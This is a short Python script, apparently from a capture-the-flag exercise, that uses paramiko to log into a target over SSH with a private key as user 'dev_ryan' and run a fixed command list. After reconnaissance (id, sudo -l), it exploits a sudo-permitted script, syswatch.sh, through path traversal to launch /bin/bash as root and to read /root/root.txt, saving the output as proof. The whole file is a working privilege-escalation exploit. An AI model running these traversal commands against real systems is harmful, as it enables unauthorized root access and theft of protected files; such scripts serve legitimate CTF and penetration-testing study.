#!/usr/bin/env python3
import paramiko

HOST = "<TARGET_IP_REDACTED>"
USER = "dev_ryan"
KEY = "/home/ctf/ctf/devarea_id_ed25519"
OUT = "/home/ctf/ctf/proof_paramiko_output.txt"

commands = [
    "id",
    "whoami",
    "hostname",
    "sudo -l",
    "sudo /opt/syswatch/syswatch.sh plugins",
    "sudo /opt/syswatch/syswatch.sh logs --list",
    'sudo /opt/syswatch/syswatch.sh plugin ../../../../bin/bash -c "id"',
    "sudo /opt/syswatch/syswatch.sh logs ../../root/root.txt",
]

key = paramiko.Ed25519Key(filename=KEY)
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, username=USER, pkey=key, timeout=8, banner_timeout=8, auth_timeout=8)

with open(OUT, "w", encoding="utf-8") as f:
    for cmd in commands:
        f.write("============================================================\n")
        f.write(f"$ {cmd}\n")
        f.write("------------------------------------------------------------\n")
        stdin, stdout, stderr = client.exec_command(cmd, timeout=20)
        out = stdout.read().decode("utf-8", "ignore")
        err = stderr.read().decode("utf-8", "ignore")
        rc = stdout.channel.recv_exit_status()
        if out:
            f.write(out)
            if not out.endswith("\n"):
                f.write("\n")
        if err:
            f.write(err)
            if not err.endswith("\n"):
                f.write("\n")
        f.write(f"[exit_code]={rc}\n\n")

client.close()
print(f"Paramiko proof run complete: {OUT}")
